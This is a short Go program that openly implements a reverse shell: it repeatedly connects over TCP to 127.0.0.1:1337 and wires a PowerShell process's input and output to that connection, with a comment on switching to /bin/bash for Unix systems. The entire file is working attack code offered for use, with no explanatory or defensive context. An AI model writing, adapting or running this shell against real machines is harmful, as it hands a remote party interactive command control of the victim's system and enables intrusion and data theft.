package main

import (
	"fmt"
	"net"
	"os/exec"
	"time"
)

// change this to `/bin/bash` if you wish to use this on unix
func runPowershell(conn net.Conn) {
	cmd := exec.Command("powershell")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
	cmd.Run()
}

func main() {
	fmt.Println("starting reverse shell..")

	for {
		conn, err := net.Dial("tcp", "127.0.0.1:1337")
		if err != nil {
			continue
		}
		go runPowershell(conn)
		time.Sleep(5 * time.Second)
	}
}
